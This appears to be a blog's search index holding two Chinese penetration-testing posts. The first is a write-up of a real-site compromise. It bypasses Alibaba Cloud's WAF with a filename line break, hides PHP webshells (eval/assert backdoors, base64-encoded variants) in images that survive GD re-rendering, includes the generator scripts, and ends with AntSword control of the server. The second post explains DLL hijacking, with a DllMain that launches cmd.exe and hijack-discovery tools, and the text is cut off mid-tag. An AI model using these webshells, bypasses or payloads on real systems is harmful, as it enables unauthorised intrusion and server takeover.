<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP任意文件上传绕过多重限制</title>
      <link href="/2021/11/24/php-ren-yi-wen-jian-shang-chuan-rao-guo-duo-chong-xian-zhi/"/>
      <url>/2021/11/24/php-ren-yi-wen-jian-shang-chuan-rao-guo-duo-chong-xian-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>在一次对站点进行安全测试中，遇到任意文件上传的漏洞，但是目标系统存在阿里云WAF和gd库的二次渲染，通过不断尝试绕过，最终拿下目标。</p><h2 id="0x02-文件上传点寻找"><a href="#0x02-文件上传点寻找" class="headerlink" title="0x02 文件上传点寻找"></a>0x02 文件上传点寻找</h2><p>注册登录到某系统后，在多个文件上传点进行测试，发现进行的大是白名单验证，没法上传除了多媒体文件外的其他类型。最后在修改资料位置对头像上传位置抓包，可以看到还传入了图像裁剪的参数(后续的测试把x,y都设置为0，避免对图片产生额外影响):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/images/2021_8/5c08fb6b3c23da8d975fe725f69a0678"><br>可以上传并返回路径，该路径可以通过拼接域名直接访问到：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/images/2021_8/f77b2f45017f1822a9063a88356203b4"><br>修改filename类型为txt，发现可以上传成功，说明该处上传没有对文件类型进行限制，是一个潜在的getshell点：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/a89a2638b73acff6d612c09305ac77d1.png"><br>尝试修改文件类型为php，不出意外被阿里云WAF拦截了：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/images/2021_8/7b49f4dc62ba5424b9e9888295f3f678"></p><h2 id="0x03-文件上传云WAF绕过"><a href="#0x03-文件上传云WAF绕过" class="headerlink" title="0x03 文件上传云WAF绕过"></a>0x03 文件上传云WAF绕过</h2><p>在之前的测试中，已经发现头像上传位置可以进行其他类型文件上传，但是测试php文件上传时被云WAF拦截了。对云WAF的绕过主要可以依靠数据包变形、分块、去除关键字特征等。</p><h3 id="文件类型检测绕过"><a href="#文件类型检测绕过" class="headerlink" title="文件类型检测绕过"></a>文件类型检测绕过</h3><p>测试将filename中的文件名用换行分隔即可绕过(从文件名中间找个位置，不是文件扩展名)<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/410bdea252313f1d41ad03f64a46daff.png"></p><h3 id="文件内容检测绕过"><a href="#文件内容检测绕过" class="headerlink" title="文件内容检测绕过"></a>文件内容检测绕过</h3><p>WAF还会检测内容，如存在常见的<code>&lt;?php</code>就会直接拦截，经过尝试，可以使用<a href="https://www.php.net/manual/zh/language.basic-syntax.phptags.php">短标签</a><code>&lt;?=phpinfo();?&gt;</code>、敏感函数替换加上传参分离得到payload <code>&lt;?=@$_=$_REQUEST;call_user_func_array('assert',array($_[_]));?&gt;</code>，服务端的systemerror是因为图像渲染出错的异常:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/f3a97502bb769fd8d953c0614482289e.png"></p><h2 id="0x04-GD库渲染绕过"><a href="#0x04-GD库渲染绕过" class="headerlink" title="0x04 GD库渲染绕过"></a>0x04 GD库渲染绕过</h2><p>上面的图片在传到后台时会被php的gd库重新渲染，因为上传的文件重新下载回来md5校验对不上。将文件类型改成txt上传，查看响应包发现特征 <code>gd-jpeg v1</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/b6b56883571bae1951fb7fca2c77595b.png"><br>看来图片是被重新渲染了，使用了php扩展gd库中的<code>imagecreatefromjpeg()</code>，<code>imagecreatefromstring()</code>,<code>imagejpeg()</code>等函数处理。这些函数在图片渲染过程中，其实存在部分原始数据没有被修改到，不同的图片类型渲染情况也不相同，主要看后端处理后是什么类型的图片特征，上面的图片从文件头JFIF和gd-jpeg看应该是用<code>imagejpeg()</code>生成的。这里对gd库的渲染绕过进行一些整理。</p><h3 id="JPG二次渲染"><a href="#JPG二次渲染" class="headerlink" title="JPG二次渲染"></a>JPG二次渲染</h3><p>使用脚本<a href="https://github.com/BlackFan/jpg_payload">jpg_payload.php</a>来处理图片需要先在头像上传的位置上传一个正常的图片，然后再把渲染后的图片下载回来用脚本处理(脚本要求，最终图像的大小必须与原始图像相同)。脚本的原理是在将webshell编码成图像数据写入到图片的<code>Scan Header</code>之后，文件生成后使用gd库测试是否能正常渲染然后输出payload图片。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/7b743250d339b97f9ace685f56a7019a.png"><br>脚本使用前需要配置好PHP运行环境，直接到<a href="https://www.php.net/downloads">PHP官网</a>，选择合适的包下载，我选择的是Windows下的zip压缩包：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/bb92686a9bbce79e47b63b5b1cde27fd.png"><br>解压完成后，到目录中看到php.ini-*的文件，选择一个重命名为php.ini,然后在其中加入<code>extension=ext/php_gd2.dll</code>开启gd扩展：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/ba639fbc66dcf3b44af93570e31e3e8c.png"><br>之后就配置下PHP的环境变量，在<code>jpg_payload.php</code>中加入要渲染的代码：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/14d96190d5237ef534eb1e49365a24a2.png"><br><code>$miniPayload</code>可能需要多次构造，比如在最前面加字符，中间加注释，字母大写等等，经过许久的尝试，构造出以下两个可用的payload:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/f5d02ea430e902cd002c5b52af6aff2b.png"><br>在JPEG文件格式中，shell代码会放在Scan Header (00 0C 03 01 00 02 11 03 11 00 3F 00)之后：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/bffe4401500cc360bce9a47236e6c497.png"><br>在最终构造好的payload图片中看到shell数据确实是写在<code>Scan Header</code>之后的：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/83735177446e63d044cb93a76204af2b.png"><br>在burp中可以很方便的修改上传的文件，在之前的数据包右键菜单中选择从文件粘贴：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/766506ff57aeca4f5c82bcac64bf6d82.png"><br>上传成txt观察响应，发现php代码没有被破坏：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/7ffcbed4eb7aa11255b50d62b81aa264.png"><br>改成PHP后上传，访问(没有出现语法错误或者解析错误，Deprecated是说不推荐用字符串参数来调用assert断言，因为用了call_user_func_array回调，参数1就是字符串assert)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/41529e89ba7908d6d1aabcb22ea1b294.png"><br>然后测试shell执行情况，发现阿里云WAF对特征字符的拦截十分严格，执行<code>var_dump</code>，<code>phpinfo</code>马上就拦截，用PHP7特性执行<code>(phpinfo)()</code>会造成响应超时，应该还检测了响应数据。这里用一个没被拦截的函数<code>die()</code>输出数字来测试webshell执行情况：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/a6212df4ff34bad88663bd36a1f7e228.png"><br>可以看到成功执行了，说明shell还是可以用的，就是需要绕过流量特征检测，下一小节会继续对阿里云的流量检测进行绕过，完整使用webshell。这一节里继续整理下GD库对其他文件格式渲染的绕过。</p><h3 id="GIF二次渲染"><a href="#GIF二次渲染" class="headerlink" title="GIF二次渲染"></a>GIF二次渲染</h3><p>常见的方法是将GIF上传后的文件下载回来与源文件对比，找到未进行修改的部分插入PHP代码，但是操作起来很不方便。有没有类似JPG实现的自动脚本呢？在<a href="https://blog.isec.pl/injection-points-in-popular-image-formats/">一篇博客</a>中发现了实现方法，原脚本将生成一个纯色的GIF图，将脚本修改后可以对任意GIF文件进行代码注入：</p><pre><code class="php">&lt;?php// createGIFwithGlobalColorTable.php$_file="example.gif";  //保存的文件名 $_payload="00php /*123456789abcdefgh&lt;?php 12345*/eval(\$_GET[1]);/*ijk*/eval(\$_REQUEST['11pass'])?&gt;";   // POC$_width=200; $_height=200;if(strlen($_payload)%3!=0){ echo "payload%3==0 !"; exit();}$im = imagecreate($_width, $_height); // 创建新的gif图$im  = imagecreatefromstring(file_get_contents("SwipeTeachingCalloutImage.layoutdir-LTR.gif"));  //使用提供的Gif图$_hex=unpack('H*',$_payload);$colors_hex=str_split($_hex[1], 6);for($i=0; $i &lt; count($colors_hex); $i++){  $_color_chunks=str_split($colors_hex[$i], 2);  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));  imagesetpixel($im,$i,1,$color);}imagegif($im,$_file);?&gt;</code></pre><p>经过一番尝试，找到一个合适的GIF图片，并将PHP代码写入(Payload长度达到了64，还可以继续追加)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/4fe658461735e1941ba91a436e4eb783.png"><br>然后将生成的<code>example.gif</code>文件使用GD库渲染得到新图<code>exploit.gif</code>：</p><pre><code class="php">&lt;?php$gif = imagecreatefromgif('example.gif');imagegif($gif, 'exploit.gif');imagedestroy($gif);?&gt;</code></pre><p>重新渲染后，完全就是一样的GIF:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/34de619a5e4f18854f01e2c8b8c726b8.png"><br>最终也是达到了可以指定GIF图、指定Payload的效果。</p><h3 id="PNG二次渲染"><a href="#PNG二次渲染" class="headerlink" title="PNG二次渲染"></a>PNG二次渲染</h3><h4 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h4><p>这种方式只针对索引彩色图像(index-color images)有效，使用<a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/poc">poc_png</a>工具写入。但是怎么看图片是否是索引彩色图像呢？可以使用Python库<a href="https://pillow.readthedocs.io/en/latest/handbook/concepts.html#modes">pillow</a>来识别图像的模式，P就是索引彩色图像：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/a9efa60ec312103eb5f9dc3283290976.png"><br>输出图像模式的代码实现：</p><pre><code class="python">#-*- coding:utf-8 -*-from PIL import Imagepath = 'input.png'img = Image.open(path)print(path+" mode:"+img.mode)path = 'php.png'img = Image.open(path)print(path+" mode:"+img.mode)</code></pre><p>转换图像模式到索引彩色图像：</p><pre><code class="python">#-*- coding:utf-8 -*-from PIL import Imagepath = 'input.png'img = Image.open(path)print(path+" mode:"+img.mode)img = img.convert('P')img.save('new.png')print(path+" mode:"+img.mode)</code></pre><p>通过将任意图片转换模式后写入数据到PLTE块：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/fae8d57ac3999b9f8127ffdf017486d5.png"></p><h4 id="写入-IDAT-数据块"><a href="#写入-IDAT-数据块" class="headerlink" title="写入 IDAT 数据块"></a>写入 IDAT 数据块</h4><p>可以通过php脚本实现，也可以使用其他语言实现的项目，Python：<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">PNG-IDAT-Payload-Generator</a>：</p><pre><code class="php">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) {   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img);//  php png_payload.php &gt; 1.png //  &lt;?=$_GET[0]($_POST[1]);?&gt;，写入的webshell</code></pre><p>其他的webshell需要通过爆破的方法得到，参考：<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p><h2 id="0x05-云WAF流量检测绕过"><a href="#0x05-云WAF流量检测绕过" class="headerlink" title="0x05 云WAF流量检测绕过"></a>0x05 云WAF流量检测绕过</h2><p>上文提到在绕过JPG的二次渲染后，使用webshell的过程中，只要在流量中出现了PHP代码的特征始终会被拦截。所以在shell中还需要进行流量上的绕过，需要将请求数据编码后在webshell中解码执行。使用BASE64编码数据后的基础免杀shell为<code>&lt;?=@$_=$_POST;@eval(base64_decode($_[_]));</code>，经过不断的尝试，终于构造出可用的图片：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/db6f9e1756a17a8de46b2dd1a28e9264.png"><br>最终payload(蚁剑中_是保留字符，所以密码修改为了d):</p><pre><code class="php">$miniPayload = '/sssdajkhsdajk*/&lt;?=@$_=$_POST;$x=BASE64_DECODE($_[d]);/*hsd*/@EVAL(($x));/*ajmjikloasdk*//*hsdajk*//*';   </code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/a491cbd51933b27de2b65b7a5bcd2400.png"><br>蚁剑的编码器用的编码器是对所有参数都base64编码(之前的流量中有很明显的PHP执行代码)，返回数据也都base64：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/4bbb7083c82f792da1e53d02997c4568.png"><br>配置编码解码：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/5a174bf482fe93a385e9b93519b7d3eb.png"><br>发起的请求包如下：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/c0fe29292e41807374e2439b7676e40f.png"><br>最终也是使用蚁剑接管了该阿里云服务器：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/06abe468a3b8b55d3790c9d6e9e49d37.png"><br>查看权限：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/2ab758ca0dcad1c23944ce4dd573238f.png"></p><p>云WAF的流量绕过也可以通过真实IP或者其他解析到站点的域名，因为管理员可能没有对所有的域名和IP走云WAF，就可以只绕过上传php文件的拦截，后面的流量检测是没有的。最开始拿到shell也是走一个加速域名(shell后查看了图片渲染处的源码，为后续直接对阿里云的POC构造省下了好多事)，这里估计是开发想着所有流量都过云WAF会很慢，于是把很多静态资源放在了另外一个域名上，但是这个域名并没有受到云WAF保护，没有云WAF保护，利用上面的二次渲染绕过直接getshell：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/images/2021_8/7ed3aadabbd57a31636424043e96d10e"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>从这个实例中，研究了GIF、PNG、JPG图片二次渲染，并整理了生成工具。在漏洞点有二次渲染且存在阿里云WAF的情况下，getshell的流程方法。包括:<br>1.换行绕过阿里云WAF上传文件检测；<br>2.jpg_paylaod脚本绕过图片二次渲染；<br>3.webshell免杀过云WAF上传;<br>4.流量编码过WAF流量检测。<br>5.一些用到的基础PHPwebshell:</p><pre><code class="php">//过文件内容检测&lt;?=@$_=$_REQUEST;eval(array($_[_])[0]);&lt;?=@$_=$_POST;call_user_func_array("assert",array($_[_]));//过文件内容和流量检测&lt;?=@$_=$_POST;$x=BASE64_DECODE($_[d]);@EVAL(($x));</code></pre><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a><br><a href="https://aboutsc.tistory.com/204">https://aboutsc.tistory.com/204</a><br><a href="https://secgeek.net/bookfresh-vulnerability/">https://secgeek.net/bookfresh-vulnerability/</a><br><a href="https://www.sqlsec.com/2020/07/shell.html">https://www.sqlsec.com/2020/07/shell.html</a><br><a href="https://rdot.org/forum/showthread.php?t=2780">https://rdot.org/forum/showthread.php?t=2780</a><br><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a><br><a href="https://blog.isec.pl/injection-points-in-popular-image-formats/">https://blog.isec.pl/injection-points-in-popular-image-formats/</a><br><a href="https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif">https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif</a><br><a href="https://pillow.readthedocs.io/en/latest/handbook/concepts.html#modes">https://pillow.readthedocs.io/en/latest/handbook/concepts.html#modes</a><br><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a><br><a href="https://blog.safebuff.com/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/">https://blog.safebuff.com/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阿里云WAF绕过 </tag>
            
            <tag> PHP二次渲染绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL劫持漏洞</title>
      <link href="/2021/11/18/dll-jie-chi/"/>
      <url>/2021/11/18/dll-jie-chi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>DLL劫持是一种诱使正常的应用程序加载任意DLL的技术，通过这种技术，DLL将会被加载到目标程序内存中，以目标程序身份进行代码执行、权限维持和权限提升。</p><h2 id="0x02-什么是-DLL"><a href="#0x02-什么是-DLL" class="headerlink" title="0x02 什么是 DLL"></a>0x02 什么是 DLL</h2><p>在进行DLL劫持之前，先熟悉一下什么是DLL。在WIndows中DLL(Dynamic link library，动态链接库)是一个共享的库，其中包含可同时由多个程序使用的代码和数据，对常用函数和功能进行封装，这些DLL可实现不同的功能，每个DLL的功能实现可通过导出函数来提供调用接口。在Windows的不同系统目录中存在大量的DLL文件，应用程序在实现时相应的功能时会调用这些DLL程序。</p><h3 id="DLL-入口函数"><a href="#DLL-入口函数" class="headerlink" title="DLL 入口函数"></a>DLL 入口函数</h3><p><code>dllmain</code>是DLL的入口函数，当进程或线程加载DLL或分离DLL时，将调用入口点函数传入对应事件通知，示例：</p><pre><code class="c++">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include &lt;stdio.h&gt;BOOL APIENTRY DllMain( HMODULE hModule, //  DLL模块的句柄                       DWORD  ul_reason_for_call, // 调用函数的原因                       LPVOID lpReserved  // 保留参数                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:      // 进程加载DLL触发( LoadLibraryA)        {  printf("DLL_PROCESS_ATTACH!\n");        WinExec("cmd.exe", 0); break; }    case DLL_THREAD_ATTACH:       // 进程创建新线程加载触发(CreateThread)        {  break; }    case DLL_THREAD_DETACH:       // 线程正常退出(CreateThread-Return)        {  break; }    case DLL_PROCESS_DETACH:      // 进程卸载DLL(函数：FreeLibrary、FreeLibraryAndExitThread)        { break; }  }    return TRUE;}</code></pre><h3 id="DLL-导出函数"><a href="#DLL-导出函数" class="headerlink" title="DLL 导出函数"></a>DLL 导出函数</h3><p>编写DLL时通过<code>__declspec(dllexport)</code>关键字声明要导出的函数：</p><pre><code class="c++">extern "C" __declspec(dllexport) void StartW(HWND hwnd,HINSTANCE hinst){///}</code></pre><p>这样编写的DLL生成后可以通过<code>dumpbin /EXPORTS xxx.dll</code>查看导出函数表:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/af012daf3b88052cd24f7f374f70f3cb.png"></p><p>在VS中选择可“具有导出项的(DLL)动态链接库”项目编写DLL：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/eb948a5aa873e0458dc3985afa59af87.png"></p><p>这种项目生成DLL的导出函数是通过<code>LIBDLL_API</code>定义的，如<code>LibDLL.h</code>中导出的<code>fnLibDLL</code>函数：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/156221e59808a4686af76fc0f51ed559.png"><br><code>LibDLL.cpp</code>中编写导出函数的功能：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/85236108c7a88461026ff3eb1d6ac62a.png"><br>项目编译后的DLL文件导出函数是被修饰过的：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/dc54ffc9de23b36428a7ad8caadb6cee.png"></p><h2 id="0x03-加载-DLL-的方法"><a href="#0x03-加载-DLL-的方法" class="headerlink" title="0x03 加载 DLL 的方法"></a>0x03 加载 DLL 的方法</h2><p>在应用程序中可以通过<strong>加载时动态链接</strong>或<strong>运行时动态链接</strong>两种方法调用DLL中的导出函数。加载时动态链接使用<code>#include &lt;xxx.h&gt;</code>导入头文件和<code>#pragma comment(lib, "xxx.lib")</code>导入链接库文件，程序会使用链接器放置在文件中的信息来查找进程使用的 DLL 的名称，然后搜索 DLL进行调用，这种方式是使用lib静态库文件进行链接，所以也被称为静态链接。运行时动态链接是在程序需要的时候使用<code>LoadLibrary</code>、<code>LoadLibraryEx</code>、<code>GetProcAddress</code> 等API函数组合获取到DLL导出函数的地址来调用，所以也称为动态链接。</p><h3 id="加载时动态链接"><a href="#加载时动态链接" class="headerlink" title="加载时动态链接"></a>加载时动态链接</h3><p>在上文中编写了一个具有导出函数的DLL文件，这里使用静态链接的方式调用DLL函数,<code>LibDLL.h</code>、<code>LibDLL.lib</code>都是在DLL项目生成或者定义的：</p><pre><code class="c++">#include &lt;iostream&gt;#include "..\\LibDLL\\LibDLL.h"#pragma comment(lib, "..\\LibDLL\\Release\\LibDLL.lib")int main(){    fnLibDLL();}</code></pre><p>编写的EXE程序运行后成功调用了DLL中的<code>fnLibDLL</code>函数：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b390b4b3fe0cb5c2dec5fe4e07f40d69.png"><br>如果在DLL中没有<code>fnLibDLL</code>函数，静态链接的DllMain函数不会执行并且会抛出异常：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f97b3fd5f09b6e4fa12210054404440b.png"></p><h3 id="运行时动态链接"><a href="#运行时动态链接" class="headerlink" title="运行时动态链接"></a>运行时动态链接</h3><p>通过<code>LoadLibrary</code>获取DLL句柄， <code>GetProcAddress</code> 从返回的句柄中获取函数的地址(注意这里的函数名用的是被修饰过的<code>?fnLibDLL@@YAHXZ</code>)：</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;libloaderapi.h&gt;int main(){    int(__stdcall * CMD)();    HMODULE DLL = LoadLibrary(L"LibDLL.dll");    (FARPROC&amp;)CMD = GetProcAddress(DLL, "?fnLibDLL@@YAHXZ");    CMD();}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9a37229001159aab0fe6f330221c0a93.png"></p><p>加载有<code>DllMain</code>的DLL时，<code>LoadLibrary</code>后就进入<code>DllMain</code>函数了(与静态链接不同，即使调用的函数不存在也会执行DllMain)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/3f7a4677b83e7661ad56426c3c199217.png"></p><h2 id="0x04-DLL-搜索顺序"><a href="#0x04-DLL-搜索顺序" class="headerlink" title="0x04 DLL 搜索顺序"></a>0x04 DLL 搜索顺序</h2><p>在程序通过上述两种方式加载DLL时，都会进行DLL的搜索。会加载搜索过程中找到的第一个名称正确的DLL。系统搜索DLL之前，它会检查以下内容，如果已经存在了就不会搜索DLL：</p><ol><li>如果内存中已经加载了具有相同模块名称的 DLL。</li><li>KnownDLLs注册表项（HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs）。</li></ol><p>上面都没有找到DLL的情况下，如果启用了<code>SafeDllSearchMode</code>， 就按照如下搜索顺序搜索：</p><ol><li>应用程序加载目录(安装目录)；</li><li>系统目录(C:\Windows\System32，使用 GetSystemDirectory 函数获取)；</li><li>16 位系统目录(C:\Windows\System);</li><li>Windows 目录(C:\Windows,使用 GetWindowsDirectory函数获取);</li><li>当前目录;</li><li>PATH 环境变量中列出的目录。 </li></ol><p>如果 <code>SafeDllSearchMode</code> 已禁用，则搜索顺序如下：</p><ol><li>应用程序加载目录(安装目录)；</li><li>当前目录;</li><li>系统目录(C:\Windows\System32，使用 GetSystemDirectory 函数获取)；</li><li>16 位系统目录(C:\Windows\System);</li><li>Windows 目录(C:\Windows,使用 GetWindowsDirectory函数获取);</li><li>PATH 环境变量中列出的目录。 </li></ol><h2 id="0x05-发现-DLL-劫持"><a href="#0x05-发现-DLL-劫持" class="headerlink" title="0x05 发现 DLL 劫持"></a>0x05 发现 DLL 劫持</h2><p>从上述中可以看到，DLL加载时会按照顺序进行搜索，如果一个DLL位于<code>C:\Windows\System32</code>的系统目录且不在<code>KnownDLLs</code>注册表项中，程序使用LoadLibrary直接加载DLL名称时就会先搜索系统目录之前的应用程序加载目录或当前目录，通过在系统目录之前的位置放置同名DLL就可能导致DLL搜索顺序劫持。一些程序在启动或执行某些功能时会  借助下列工具可快速发现程序在加载DLL时的问题。</p><h3 id="Process-Monitor"><a href="#Process-Monitor" class="headerlink" title="Process Monitor"></a>Process Monitor</h3><p>微软官方提供了一个<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite">系统工具套件</a>，其中包含一个进程监控工具 <code>Procmon.exe</code>，可以使用该工具来寻找可能发生DLL劫持的程序，微软文档介绍的<a href="https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN">使用进程监视器检查应用程序中的 DLL 加载操作</a>如下：<br>1.启动进程监视器。<br>2.在进程监视器中，包括以下筛选器：</p><pre><code class="python">Operation is CreateFileOperation is Load ImagePath contains .cplPath contains .dllPath contains .drvPath contains .exePath contains .ocxPath contains .scrPath contains .sys</code></pre><p>3.排除以下筛选器：</p><pre><code class="python">Process Name is procmon.exeProcess Name is Procmon64.exeProcess Name is SystemOperation begins with IRP_MJ_Operation begins with FASTIO_Result is SUCCESSPath ends with pagefile.sys</code></pre><p>4.尝试在程序安装目录启动程序；尝试将程序复制到其他目录启动程序；尝试启动程序支持解析的扩展文件(如启动.docx)。<br>5.检查进程监视器输出中的可疑路径，如调用当前目录加载 DLL。 这种调用表示应用程序中可能存在漏洞。<br>在进程监视器中输出了进程加载的行为,后续可针对这些程序进行DLL劫持测试：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e62dc89ed6e7973b1a532135d0dfc1d4.png"></p><p>通过该工具验证DLL搜索顺序。某程序使用<code> LoadLibrary(L"qax.dll");</code>后的搜索顺序如下：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/1f4527affc61aa31808e5079312d2d5a.png"></p><h3 id="ImpulsiveDLLHijack"><a href="#ImpulsiveDLLHijack" class="headerlink" title="ImpulsiveDLLHijack"></a>ImpulsiveDLLHijack</h3><p><a href="https://github.com/knight0x07/ImpulsiveDLLHijack">ImpulsiveDLLHijack</a>  通过解析ProcMon 监控数据，得到进程加载DLL的信息，将测试DLL添加或替换到程序目录下，然后反复启动程序加载测试DLL。程序的源码中包含了已编译的程序，可以直接使用(建议虚拟机中)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/301987f07ea2f7c9ace78aec4ba31008.png"><br>执行命令来测试劫持 <code>ImpulsiveDLLHijack.exe -path "D:\Program Files (x86)\Notepad++\notepad++.exe"</code>，执行完成后会显示结果和写入日志：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/005da7a7a3ab8b54d3d997d2fed0eb30.png"><br>这些劫持成功的可以用<code>Calc DLL POC</code>文件夹下弹出计算器的DLL验证：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0d346bf7e5d8eb4ffeaa61959787773f.png"></p><p>程序显示劫持成功的DLL都是可以直接进入DllMain函数，如<code>uxtheme.dll</code>甚至可以用<code>beacon.dll</code>不做任何处理进行替换。其他的DLL可能需要进行导出函数的代理转发或线程迁移才能正常运行，否则会抛出一些异常信息，这部分实现会在后文继续涉及。</p><h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p>在程序的安装目录中存在许多的DLL，程序在触发某些操作时会进行加载，如果不借助工具怎么快速发现程序加载DLL的行为进行利用呢？一种是将可执行文件复制到其他目录，然后执行文件，利用异常来发现程序的加载行为：<br><img 